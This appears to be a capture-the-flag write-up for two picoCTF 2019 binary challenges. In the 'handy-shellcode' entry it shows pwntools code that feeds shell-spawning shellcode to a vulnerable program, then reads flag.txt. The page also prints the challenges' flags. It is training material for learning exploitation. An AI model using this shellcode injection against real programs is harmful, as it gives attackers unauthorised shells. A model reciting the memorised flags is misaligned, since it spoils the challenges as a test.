<center><h1>Binary</h1></center>
<br><br>
<center><h2>handy-shellcode [50]</h2></center>
<br>
Q: This *[program](/picoctf2019/files/handyShellcodeVuln)* executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5 on the shell server. *[Source](/picoctf2019/files/handyShellcodeVuln.c)*.

A: It tells us exactly what to do. Easiest way to spawn a shell would be to use pwn tools with python. Log into the shell server and navigate to ```/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5``` which is where the ```vuln``` binary and ```flag.txt``` are stored. Here we are going to spawn our shell. Using the 4 lines of python code below we are able to grab the flag.
```
# cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5
/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ python
>>> from pwn import *
>>> sh = process('./vuln')
[x] Starting local process './vuln'
[+] Starting local process './vuln': pid 2276666
>>> sh.sendlineafter(':\n', asm(shellcraft.i386.linux.sh()))
'Enter your shellcode'
>>> sh.interactive()
[*] Switching to interactive mode
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀
Thanks! Executing now...

cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}
```
Flag:```picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}```
<br>
<center><h2>practice-run-1</h2></center>
<br>
Q: You're going to need to know how to run programs if you're going to get out of here. Navigate to /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e on the shell server and run this *[program](/picoctf2019/files/run_this)* to receive a flag.

A: Two ways to do this.
1. Navigate to ```/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e``` and execute the program
```
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
2. Download the file to your computer, make the file executable and then run it.
```
# chmod +x run_this
# ./run_this
picoCTF{g3t_r3adY_2_r3v3r53}
```
Flag:```picoCTF{g3t_r3adY_2_r3v3r53}```
<br>
